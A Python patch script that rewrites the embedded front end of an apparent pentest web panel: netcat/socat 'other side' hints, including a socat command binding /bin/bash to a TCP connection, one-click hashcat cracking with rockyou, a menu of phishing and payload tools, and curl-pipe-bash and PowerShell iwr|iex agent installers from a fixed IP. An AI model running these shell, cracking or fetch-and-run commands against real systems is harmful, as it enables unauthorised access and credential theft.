#!/usr/bin/env python3
"""
Patch 03 FIX - Run from ~/vulnscan/
"""
import os, shutil, subprocess, sys
from datetime import datetime

G="\033[92m"; R="\033[91m"; C="\033[96m"; RS="\033[0m"; B="\033[1m"
def ok(m): print(f"  {G}+{RS} {m}")
def fail(m): print(f"  {R}x{RS} {m}")
def sk(m): print(f"  . {m}")
applied=0; failed=0; skipped=0

def backup(p):
    shutil.copy2(p, f"{p}.{datetime.now().strftime('%H%M%S')}.p03fix.bak")

with open("api_server.py","r",encoding="utf-8",errors="ignore") as f:
    S = f.read()
ORIG = S

print(f"\n{B}{C}Patch 03 FIX{RS}\n")

def ap(label, old, new):
    global S, applied, failed, skipped
    if old in S:
        S = S.replace(old, new, 1)
        ok(label); applied+=1
    elif new.strip()[:60] in S:
        sk(f"{label} (already applied)"); skipped+=1
    else:
        fail(f"{label} — anchor not found"); failed+=1

# ── 1. Netcat other-side command ──────────────────────────────────────────────
ap("Netcat: other-side command",
'async function runNetcat(){\n  var mode=document.getElementById(\'nc-mode\').value, host=document.getElementById(\'nc-host\').value.trim(), port=parseInt(document.getElementById(\'nc-port\').value||\'0\',10), extra=document.getElementById(\'nc-extra\').value.trim(), timeout=parseInt(document.getElementById(\'nc-timeout\').value||\'90\',10);\n  if(!port||port<1||port>65535){alert(\'Enter a valid port\');return;}\n  if(mode===\'connect\'&&!host){alert(\'Enter target host for connect mode\');return;}\n  var args=(mode===\'listen\'?(\'-l -p \'+port):((host+\' \'+port)))+(extra?\' \'+extra:\'\');\n  var btn=document.getElementById(\'nc-btn\');btn.disabled=true;btn.innerHTML=\'<span class="spin"></span> Running...\';\n  ncTool.start();ncTool.log(\'Executing netcat mode: \'+mode,\'i\');\n  try{\n    var r=await fetchWithTimeout(\'/social-tools/run\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({tool:\'netcat\',operation:\'custom\',args:args,timeout:timeout})},Math.max(20000,timeout*1000+5000),\'nc\');\n    var d=await r.json();ncTool.end();if(d.error){ncTool.err(d.error);}else{ncTool.log(\'Netcat command completed\',\'s\');renderSocialTool(ncTool,d);}\n  }catch(e){ncTool.end();ncTool.err(e.message);}\n  finally{btn.disabled=false;btn.innerHTML=\'RUN NETCAT\';}\n}',
r"""async function runNetcat(){
  var mode=document.getElementById('nc-mode').value;
  var host=document.getElementById('nc-host').value.trim();
  var port=parseInt(document.getElementById('nc-port').value||'0',10);
  var extra=document.getElementById('nc-extra').value.trim();
  var timeout=parseInt(document.getElementById('nc-timeout').value||'90',10);
  if(!port||port<1||port>65535){alert('Enter a valid port');return;}
  if(mode==='connect'&&!host){alert('Enter target host for connect mode');return;}
  var args=(mode==='listen'?('-l -p '+port):(host+' '+port))+(extra?' '+extra:'');
  var serverHost=window.location.hostname||'YOUR_IP';
  var otherCmd=mode==='listen'
    ?'nc '+serverHost+' '+port+(extra?' '+extra:'')
    :'nc -l -p '+port+(extra?' '+extra:'');
  var info=document.getElementById('nc-other-side');
  if(info){
    info.innerHTML='<div class="notice" style="margin-bottom:8px"><strong>Run on the other system:</strong> '
      +'<code style="font-family:var(--mono);font-size:11px">'+otherCmd+'</code>'
      +'<button class="btn btn-outline btn-sm" style="margin-left:8px;font-size:10px"'
      +' onclick="navigator.clipboard.writeText(\''+otherCmd.replace(/\\/g,'\\\\').replace(/'/g,"\\'")+'\');showToast(\'Copied\',\'\',\'success\',1500)">COPY</button></div>';
    info.style.display='block';
  }
  var btn=document.getElementById('nc-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
  ncTool.start();ncTool.log('Mode: '+mode,'i');ncTool.log('Other side: '+otherCmd,'w');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({tool:'netcat',operation:'custom',args:args,timeout:timeout})},
      Math.max(20000,timeout*1000+5000),'nc');
    var d=await r.json();ncTool.end();
    if(d.error){ncTool.err(d.error);}else{ncTool.log('Netcat completed','s');renderSocialTool(ncTool,d);}
  }catch(e){ncTool.end();ncTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN NETCAT';}
}""")

# ── 2. Netcat HTML div ────────────────────────────────────────────────────────
ap("Netcat HTML: other-side div",
'<div class="progress-wrap" id="nc-prog"><div class="progress-bar" id="nc-pb" style="width:0%"></div></div>\n        <div class="terminal" id="nc-term"></div>\n        <div class="err-box" id="nc-err"></div>\n        <div id="nc-res"></div>',
'<div id="nc-other-side" style="display:none"></div>\n        <div class="progress-wrap" id="nc-prog"><div class="progress-bar" id="nc-pb" style="width:0%"></div></div>\n        <div class="terminal" id="nc-term"></div>\n        <div class="err-box" id="nc-err"></div>\n        <div id="nc-res"></div>')

# ── 3. Socat other-side command ───────────────────────────────────────────────
ap("Socat: other-side command",
'async function runSocat(){\n  var left=document.getElementById(\'sc-left\').value.trim(), right=document.getElementById(\'sc-right\').value.trim(), extra=document.getElementById(\'sc-extra\').value.trim(), timeout=parseInt(document.getElementById(\'sc-timeout\').value||\'90\',10);\n  if(!left||!right){alert(\'Enter both left and right addresses\');return;}\n  var args=(extra?extra+\' \':\'\')+ left+\' \'+right;\n  var btn=document.getElementById(\'sc-btn\');btn.disabled=true;btn.innerHTML=\'<span class="spin"></span> Running...\';\n  scTool.start();scTool.log(\'Executing socat bridge\',\'i\');\n  try{\n    var r=await fetchWithTimeout(\'/social-tools/run\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({tool:\'socat\',operation:\'custom\',args:args,timeout:timeout})},Math.max(20000,timeout*1000+5000),\'sc\');\n    var d=await r.json();scTool.end();if(d.error){scTool.err(d.error);}else{scTool.log(\'Socat command completed\',\'s\');renderSocialTool(scTool,d);}\n  }catch(e){scTool.end();scTool.err(e.message);}\n  finally{btn.disabled=false;btn.innerHTML=\'RUN SOCAT\';}\n}',
r"""async function runSocat(){
  var left=document.getElementById('sc-left').value.trim();
  var right=document.getElementById('sc-right').value.trim();
  var extra=document.getElementById('sc-extra').value.trim();
  var timeout=parseInt(document.getElementById('sc-timeout').value||'90',10);
  if(!left||!right){alert('Enter both left and right addresses');return;}
  var args=(extra?extra+' ':'')+left+' '+right;
  var serverHost=window.location.hostname||'YOUR_IP';
  var pm=left.match(/:(\d+)/)||right.match(/:(\d+)/);
  var listenPort=pm?pm[1]:'PORT';
  var otherCmd='socat - TCP:'+serverHost+':'+listenPort;
  if(left.indexOf('EXEC')>=0||right.indexOf('EXEC')>=0)
    otherCmd='socat TCP:'+serverHost+':'+listenPort+' EXEC:/bin/bash';
  var info=document.getElementById('sc-other-side');
  if(info){
    info.innerHTML='<div class="notice" style="margin-bottom:8px"><strong>Run on the other system:</strong> '
      +'<code style="font-family:var(--mono);font-size:11px">'+otherCmd+'</code>'
      +'<button class="btn btn-outline btn-sm" style="margin-left:8px;font-size:10px"'
      +' onclick="navigator.clipboard.writeText(\''+otherCmd.replace(/\\/g,'\\\\').replace(/'/g,"\\'")+'\');showToast(\'Copied\',\'\',\'success\',1500)">COPY</button></div>';
    info.style.display='block';
  }
  var btn=document.getElementById('sc-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
  scTool.start();scTool.log('Socat: '+left+' <-> '+right,'i');scTool.log('Other side: '+otherCmd,'w');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({tool:'socat',operation:'custom',args:args,timeout:timeout})},
      Math.max(20000,timeout*1000+5000),'sc');
    var d=await r.json();scTool.end();
    if(d.error){scTool.err(d.error);}else{scTool.log('Socat completed','s');renderSocialTool(scTool,d);}
  }catch(e){scTool.end();scTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN SOCAT';}
}""")

# ── 4. Socat HTML div ─────────────────────────────────────────────────────────
ap("Socat HTML: other-side div",
'<div class="progress-wrap" id="sc-prog"><div class="progress-bar" id="sc-pb" style="width:0%"></div></div>\n        <div class="terminal" id="sc-term"></div>\n        <div class="err-box" id="sc-err"></div>\n        <div id="sc-res"></div>',
'<div id="sc-other-side" style="display:none"></div>\n        <div class="progress-wrap" id="sc-prog"><div class="progress-bar" id="sc-pb" style="width:0%"></div></div>\n        <div class="terminal" id="sc-term"></div>\n        <div class="err-box" id="sc-err"></div>\n        <div id="sc-res"></div>')

# ── 5. Hashcat auto-detect ────────────────────────────────────────────────────
ap("Hashcat: auto-detect + auto-crack",
'/* hashcat */\nasync function runHashcat(){',
r"""/* hashcat */
var _HC={
  bcrypt:/^\$2[aby]\$\d+\$/,sha512c:/^\$6\$/,sha256c:/^\$5\$/,md5c:/^\$1\$/,
  phpass:/^\$P\$/,apr1:/^\$apr1\$/,
  md5:/^[a-fA-F0-9]{32}$/,sha1:/^[a-fA-F0-9]{40}$/,
  sha256:/^[a-fA-F0-9]{64}$/,sha512:/^[a-fA-F0-9]{128}$/,
  ntlm:/^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$/
};
var _HCM={bcrypt:'3200',sha512c:'1800',sha256c:'7400',md5c:'500',phpass:'400',apr1:'1600',
          md5:'0',sha1:'100',sha256:'1400',sha512:'1700',ntlm:'1000'};
var _HCN={bcrypt:'bcrypt',sha512c:'sha512crypt',sha256c:'sha256crypt',md5c:'md5crypt',
          phpass:'phpass (WordPress)',apr1:'APR1-MD5',
          md5:'MD5',sha1:'SHA1',sha256:'SHA-256',sha512:'SHA-512',ntlm:'NTLM'};
function hashcatDetect(){
  var raw=document.getElementById('hashcat-hashes').value.trim();
  if(!raw)return null;
  var h=raw.split('\n').map(function(l){l=l.trim();
    return (l.indexOf(':')>-1&&l.split(':').length===2&&l.split(':')[1].length>20)?l.split(':')[1]:l;
  }).filter(Boolean)[0]||'';
  var found=null;
  Object.keys(_HC).forEach(function(k){if(!found&&_HC[k].test(h))found=k;});
  var el=document.getElementById('hashcat-detect-info');
  var sel=document.getElementById('hashcat-type');
  if(found){
    if(el)el.innerHTML='<div class="notice" style="margin:4px 0 8px;border-left-color:var(--green)">&#10003; Detected: <strong>'+_HCN[found]+'</strong> (mode '+_HCM[found]+')</div>';
    if(sel)sel.value=_HCM[found];
    return _HCM[found];
  }
  if(el)el.innerHTML='<div class="notice" style="margin:4px 0 8px">Could not auto-detect — select manually.</div>';
  return null;
}
async function hashcatAutoCrack(){
  var mode=hashcatDetect();
  if(!mode){alert('Cannot detect hash type — select manually then click RUN HASHCAT');return;}
  var wl=document.getElementById('hashcat-wordlist');
  if(wl)wl.value='/usr/share/wordlists/rockyou.txt';
  await runHashcat();
}
async function runHashcat(){""")

# Hashcat HTML: oninput + detect buttons
ap("Hashcat HTML: detect/auto-crack buttons",
'<textarea class="inp inp-mono" id="hashcat-hashes" rows="4" placeholder="5f4dcc3b5aa765d61d8327deb882cf99&#10;/path/to/hashes.txt"></textarea>',
'<textarea class="inp inp-mono" id="hashcat-hashes" rows="4" placeholder="5f4dcc3b5aa765d61d8327deb882cf99&#10;/path/to/hashes.txt" oninput="hashcatDetect()"></textarea>\n          </div>\n          <div id="hashcat-detect-info"></div>\n          <div style="display:flex;gap:8px;margin-bottom:10px">\n            <button class="btn btn-outline btn-sm" onclick="hashcatDetect()">&#128270; DETECT TYPE</button>\n            <button class="btn btn-primary btn-sm" onclick="hashcatAutoCrack()">&#9889; AUTO-CRACK (rockyou)</button>\n          </div>\n          <div class="fg" style="display:none">')

# ── 6. Nav search ─────────────────────────────────────────────────────────────
ap("Nav search: vsNavSearch function",
'loadUser();\nsetTimeout(renderHomeToolCatalog,120);',
r"""/* ==== NAV SEARCH ==== */
var _NAV=[
  {id:'home',n:'Home'},{id:'dash',n:'Dashboard'},{id:'hist',n:'Scan History'},
  {id:'scan',n:'Network Scanner nmap'},
  {id:'dnsrecon',n:'DNSRecon DNS'},{id:'disc',n:'Network Discovery'},
  {id:'sub',n:'Subdomain Finder'},{id:'legion',n:'Legion SMB SNMP'},
  {id:'searchsploit',n:'SearchSploit ExploitDB'},{id:'seclists',n:'SecLists Wordlists'},
  {id:'webdeep',n:'Deep Web Audit'},{id:'nikto',n:'Nikto Web'},
  {id:'wpscan',n:'WPScan WordPress'},{id:'dir',n:'Directory Buster dirbust'},
  {id:'ffuf',n:'ffuf Fuzzer'},{id:'nuclei',n:'Nuclei Templates CVE'},
  {id:'whatweb',n:'WhatWeb Fingerprint'},{id:'wapiti',n:'Wapiti Scanner'},
  {id:'dalfox',n:'Dalfox XSS'},{id:'sqlmap',n:'SQLMap SQL Injection'},
  {id:'kxss',n:'kxss XSS'},{id:'brute',n:'Brute Force HTTP SSH'},
  {id:'medusa',n:'Medusa Login'},{id:'hping3',n:'hping3 Packet'},
  {id:'scapy',n:'Scapy Network'},{id:'yersinia',n:'Yersinia Protocol'},
  {id:'hashcat',n:'Hashcat Password Crack'},{id:'john',n:'John the Ripper'},
  {id:'setoolkit',n:'SET Social Engineer Phishing'},
  {id:'gophish',n:'Gophish Phishing Campaign'},
  {id:'evilginx2',n:'Evilginx2 Proxy'},{id:'shellphish',n:'ShellPhish'},
  {id:'netcat',n:'Netcat TCP UDP nc'},{id:'socat',n:'Socat Bridge'},
  {id:'ligolo',n:'Ligolo Tunnel Pivot'},{id:'msfvenom',n:'msfvenom Payload Metasploit'},
  {id:'radare2',n:'Radare2 Reverse Engineering'},
  {id:'lynis',n:'Lynis Audit chkrootkit rkhunter openvas'},
  {id:'openvas',n:'OpenVAS Vulnerability'},{id:'chkrootkit',n:'chkrootkit Rootkit'},
  {id:'rkhunter',n:'rkhunter Rootkit Hunter'},
  {id:'admin',n:'Admin Console Users'},{id:'profile',n:'Profile Settings'},
];
var _NR=[],_NI=-1;
function vsNavSearch(q){
  var box=document.getElementById('nav-search-results');
  if(!box)return;
  q=(q||'').trim().toLowerCase();
  if(!q){box.style.display='none';return;}
  _NR=_NAV.filter(function(t){return t.n.toLowerCase().indexOf(q)>=0;}).slice(0,10);
  if(!_NR.length){box.style.display='none';return;}
  box.innerHTML=_NR.map(function(t,i){
    var hi=t.n.replace(new RegExp('('+q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','gi'),'<strong>$1</strong>');
    return '<div class="nav-item" id="nsr'+i+'" onclick="pg(\''+t.id+'\',null);vsNavClear()"'
      +' style="padding:8px 12px;border-bottom:1px solid var(--border);border-radius:0">'+hi+'</div>';
  }).join('');
  box.style.display='block';_NI=-1;
}
function vsNavSearchKey(e){
  if(e.key==='Escape'){vsNavClear();return;}
  if(e.key==='Enter'){
    if(_NI>=0&&_NR[_NI]){pg(_NR[_NI].id,null);vsNavClear();}
    else if(_NR.length===1){pg(_NR[0].id,null);vsNavClear();}
    return;
  }
  if(e.key==='ArrowDown'){_NI=Math.min(_NI+1,_NR.length-1);_nvHL();e.preventDefault();}
  if(e.key==='ArrowUp'){_NI=Math.max(_NI-1,0);_nvHL();e.preventDefault();}
}
function _nvHL(){_NR.forEach(function(_,i){var el=document.getElementById('nsr'+i);if(el)el.classList.toggle('active',i===_NI);});}
function vsNavClear(){
  var b=document.getElementById('nav-search-results'),i=document.getElementById('nav-search-input');
  if(b)b.style.display='none';if(i)i.value='';_NR=[];_NI=-1;
}
document.addEventListener('click',function(e){
  var b=document.getElementById('nav-search-results'),i=document.getElementById('nav-search-input');
  if(b&&i&&!b.contains(e.target)&&e.target!==i)b.style.display='none';
});
/* END NAV SEARCH */
loadUser();
setTimeout(renderHomeToolCatalog,120);""")

# ── 7. Admin: remove Add New Monitored Service ────────────────────────────────
OLD_SVC_FORM = '''          <div class="card">
            <div class="card-header"><div class="card-title">Add New Monitored Service</div></div>
            <div class="card-p">
              <div class="grid3">
                <div class="fg">
                  <label>Quick Add</label>
                  <select class="inp inp-mono" id="svc-preset" onchange="applyServicePreset()">
                    <option value="">-- Select preset --</option>
                    <option value="apache2">Apache service</option>
                    <option value="supabase">Supabase connectivity</option>
                  </select>
                </div>
                <div class="fg"><label>Display Name</label><input class="inp inp-mono" id="svc-label" type="text" placeholder="My Service"/></div>
                <div class="fg"><label>Service Key</label><input class="inp inp-mono" id="svc-key" type="text" placeholder="my-service"/></div>
              </div>
              <div class="grid3">
                <div class="fg">
                  <label>Service Type</label>
                  <select class="inp inp-mono" id="svc-kind">
                    <option value="systemctl">systemctl unit</option>
                    <option value="command">custom command check</option>
                  </select>
                </div>
                <div class="fg"><label>Systemd Unit</label><input class="inp inp-mono" id="svc-unit" type="text" placeholder="apache2"/></div>
                <div class="fg"><label>Check Command (command type)</label><input class="inp inp-mono" id="svc-check" type="text" placeholder="python3 health_check.py"/></div>
              </div>
              <div style="margin-top:10px"><button class="btn btn-primary" onclick="addMonitoredService()">Add Service</button></div>
              <div id="svc-msg" style="margin-top:10px;color:var(--text3);font-size:12px"></div>
            </div>
          </div>'''
ap("Admin: remove Add New Monitored Service", OLD_SVC_FORM, '<!-- Add New Monitored Service removed -->')

# ── 8. Auditing: unified agent page ──────────────────────────────────────────
OLD_LY_HEADER = '''      <div class="page" id="page-lynis">
        <div class="page-hd"><div class="page-title">Lynis</div><div class="page-desc">Local system security audit</div></div>
        <div class="notice">&#9432; Run local scan by default, or click a connected agent below to run Lynis remotely on that Linux machine. If you disconnect an agent, run the install curl command again on that Linux host to reconnect.</div>
        <div class="card card-p" style="margin-bottom:14px">
          <div class="fg" style="margin-bottom:10px">
            <label>ONE-LINE AGENT INSTALL (Linux)</label>
            <div class="scan-bar">
              <input class="inp inp-mono" id="ly-install-cmd" type="text" readonly value="curl -fsSL http://161.118.189.254/agent/install.sh | bash"/>
              <button class="btn btn-outline btn-sm" onclick="copyLynisInstallCmd()">COPY</button>
            </div>
          </div>
          <div class="fg" style="margin-bottom:10px">
            <label>ONE-LINE AGENT INSTALL (Windows PowerShell + WSL)</label>
            <div class="scan-bar">
              <input class="inp inp-mono" id="ly-install-cmd-win" type="text" readonly value="powershell -ExecutionPolicy Bypass -Command &quot;iwr -UseBasicParsing http://161.118.189.254/agent/install.ps1 | iex&quot;"/>
              <button class="btn btn-outline btn-sm" onclick="copyLynisInstallCmdWin()">COPY</button>
            </div>
          </div>'''

NEW_LY_HEADER = '''      <div class="page" id="page-lynis">
        <div class="page-hd"><div class="page-title">Remote Audit</div><div class="page-desc">Lynis &middot; chkrootkit &middot; rkhunter &middot; OpenVAS &mdash; run audit tools on remote Linux systems</div></div>
        <div class="notice">&#9432; Install the universal audit agent on any Linux system. Once connected, select which audit tool to run remotely.</div>
        <div class="card card-p" style="margin-bottom:14px">
          <div class="fg" style="margin-bottom:6px">
            <label>ONE-LINE AGENT INSTALL (Linux)</label>
            <div class="scan-bar">
              <input class="inp inp-mono" id="ly-install-cmd" type="text" readonly value="curl -fsSL http://161.118.189.254/agent/install.sh | bash"/>
              <button class="btn btn-outline btn-sm" onclick="copyLynisInstallCmd()">COPY</button>
            </div>
            <div style="font-size:11px;color:var(--text3);margin-top:3px">Installs: lynis, chkrootkit, rkhunter + VulnScan agent</div>
          </div>
          <div class="fg" style="margin-bottom:10px">
            <label>ONE-LINE AGENT INSTALL (Windows PowerShell + WSL)</label>
            <div class="scan-bar">
              <input class="inp inp-mono" id="ly-install-cmd-win" type="text" readonly value="powershell -ExecutionPolicy Bypass -Command &quot;iwr -UseBasicParsing http://161.118.189.254/agent/install.ps1 | iex&quot;"/>
              <button class="btn btn-outline btn-sm" onclick="copyLynisInstallCmdWin()">COPY</button>
            </div>
          </div>
          <div class="fg" style="margin-bottom:12px">
            <label>SELECT AUDIT TOOL</label>
            <div class="pills" style="margin-top:6px">
              <button class="pill on" id="atool-lynis" onclick="pickAuditTool('lynis',this)">Lynis</button>
              <button class="pill" id="atool-chkrootkit" onclick="pickAuditTool('chkrootkit',this)">chkrootkit</button>
              <button class="pill" id="atool-rkhunter" onclick="pickAuditTool('rkhunter',this)">rkhunter</button>
              <button class="pill" id="atool-openvas" onclick="pickAuditTool('openvas',this)">OpenVAS</button>
            </div>
          </div>'''

ap("Lynis/Auditing: unified agent header", OLD_LY_HEADER, NEW_LY_HEADER)

# ── 9. pickAuditTool JS ───────────────────────────────────────────────────────
ap("Auditing: pickAuditTool JS",
'function copyLynisInstallCmd(){',
r"""var _auditTool='lynis';
function pickAuditTool(tool,el){
  _auditTool=tool;
  document.querySelectorAll('[id^="atool-"]').forEach(function(b){b.classList.remove('on');});
  if(el)el.classList.add('on');
  // Show/hide Lynis-specific options
  var lynisOnly=document.querySelectorAll('.lynis-only');
  lynisOnly.forEach(function(r){r.style.display=tool==='lynis'?'':'none';});
  showToast('Selected',tool+' will run on remote agent','info',2000);
}
// Wrap doLynis to respect selected tool
var _origDoLynis=null;
document.addEventListener('DOMContentLoaded',function(){
  _origDoLynis=window.doLynis;
  window.doLynisBtn=function(){
    if(_auditTool&&_auditTool!=='lynis'){
      // Route to remote audit job with selected tool
      var clientId=window._lySelectedAgentId||'';
      if(!clientId){lyTool.err('Select a connected agent system first.');return;}
      var btn=document.getElementById('ly-btn');
      btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running '+_auditTool+'...';
      lyTool.start();lyTool.log('Queueing '+_auditTool+' on '+clientId,'i');
      fetch('/api/remote/create-job',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({client_id:clientId,tool:_auditTool,args:{}})})
      .then(function(r){return r.json();})
      .then(function(d){
        if(d.error){lyTool.err(d.error);btn.disabled=false;btn.innerHTML='RUN LYNIS AUDIT';return;}
        lyTool.log('Job #'+d.job_id+' queued. Waiting for agent...','w');
        var poll=setInterval(function(){
          fetch('/api/remote/job-status/'+d.job_id).then(function(r){return r.json();})
          .then(function(j){
            lyTool.pct(j.progress_pct||0);
            if(j.status==='completed'||j.status==='error'||j.status==='cancelled'){
              clearInterval(poll);lyTool.end();btn.disabled=false;btn.innerHTML='RUN LYNIS AUDIT';
              var out=j.output||j.error||'No output';
              lyTool.res('<div class="card card-p"><div class="card-title" style="margin-bottom:8px">'+_auditTool+' Results</div>'
                +'<pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+out.replace(/</g,'&lt;')+'</pre></div>');
            }
          }).catch(function(){clearInterval(poll);});
        },3000);
      }).catch(function(e){lyTool.err(e.message);btn.disabled=false;btn.innerHTML='RUN LYNIS AUDIT';});
    } else {
      doLynis();
    }
  };
});
function copyLynisInstallCmd(){""")

# Replace RUN LYNIS AUDIT button onclick to use doLynisBtn
ap("Lynis: RUN button uses doLynisBtn",
'<button class="btn btn-primary" id="ly-btn" onclick="doLynis()">RUN LYNIS AUDIT</button>',
'<button class="btn btn-primary" id="ly-btn" onclick="(window.doLynisBtn||doLynis)()">RUN LYNIS AUDIT</button>')

# Add lynis-only class to profile/compliance/category rows
ap("Lynis: mark lynis-only rows",
'<div class="row2" style="margin-bottom:12px">\n            <div class="fg"><label>AUDIT PROFILE</label><select class="inp inp-mono" id="ly-profile">',
'<div class="row2 lynis-only" style="margin-bottom:12px">\n            <div class="fg"><label>AUDIT PROFILE</label><select class="inp inp-mono" id="ly-profile">')

ap("Lynis: mark category row lynis-only",
'<div class="fg"><label>FOCUS CATEGORY</label><select class="inp inp-mono" id="ly-category">',
'<div class="fg lynis-only"><label>FOCUS CATEGORY</label><select class="inp inp-mono" id="ly-category">')

# ── Write + syntax check ───────────────────────────────────────────────────────
print(f"\n{B}Writing...{RS}")
if S != ORIG:
    backup("api_server.py")
    with open("api_server.py","w",encoding="utf-8") as f: f.write(S)
    ok("api_server.py saved")
else:
    print("  No changes.")

print(f"\n{B}Syntax check...{RS}")
r = subprocess.run([sys.executable,"-m","py_compile","api_server.py"], capture_output=True, text=True)
if r.returncode==0:
    ok("api_server.py — OK")
else:
    fail("SYNTAX ERROR:\n    "+r.stderr.strip())
    print(f"\n  {R}Restoring backup...{RS}")
    baks = sorted([f for f in os.listdir('.') if f.startswith('api_server.py.') and f.endswith('.p03fix.bak')], reverse=True)
    if baks:
        shutil.copy2(baks[0], 'api_server.py')
        ok(f"Restored from {baks[0]}")

print(f"\n  Applied:{G}{applied}{RS}  Skipped:\033[2m{skipped}{RS}  Failed:{R}{failed}{RS}\n")
